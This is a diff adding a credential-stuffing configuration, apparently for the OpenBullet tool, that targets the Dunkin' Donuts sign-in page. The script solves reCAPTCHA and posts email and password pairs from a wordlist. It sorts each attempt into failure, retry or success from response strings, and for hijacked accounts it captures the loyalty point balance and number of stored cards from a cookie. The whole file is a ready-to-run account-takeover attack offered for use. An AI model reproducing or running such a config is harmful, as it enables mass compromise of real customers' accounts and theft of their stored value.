@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Dunkin",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-05T19:51:47.6527237+02:00",
+  "AdditionalInfo": "",
+  "Author": "Fairy#6869",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get_Main_Page REQUEST GET "https://www.dunkindonuts.com/en/sign-in" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+#CHECK KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "You don't have permission to access" 
+RECAPTCHA "https://www.dunkindonuts.com/en/sign-in" "6LdBZzcUAAAAAB-XtqPF8RiNX45TdtYYWtnHcSPF" -> VAR "RECAP" 
+#Post REQUEST POST "https://www.dunkindonuts.com/bin/servlet/signin" AutoRedirect=FALSE 
+  CONTENT "service=signin&email=<USER>&password=<PASS>&g-recaptcha-response=<RECAP>&currentPageURL=%2Fcontent%2Fdd%2Fen%2Fsign-in" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "referer: https://www.dunkindonuts.com/en/sign-in" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "csrf-token: undefined" 
+#keys KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, the information you supplied does not match our records" 
+    KEY "Invalid password symbols!" 
+  KEYCHAIN Retry OR 
+    KEY "Bad Request." 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(*)>" Contains "\"{\"firstName" 
+#PARSE_COOKIE PARSE "<COOKIES(user_info)>" LR "" "" -> VAR "COOKIE" 
+#CAPTURE_POINTS PARSE "<COOKIE>" LR "" "" -> CAP "Loyalty Points" 
+#CAPTURE_N_OF_CARDS PARSE "<COOKIE>" LR "" "" -> CAP "Num of Cards" 
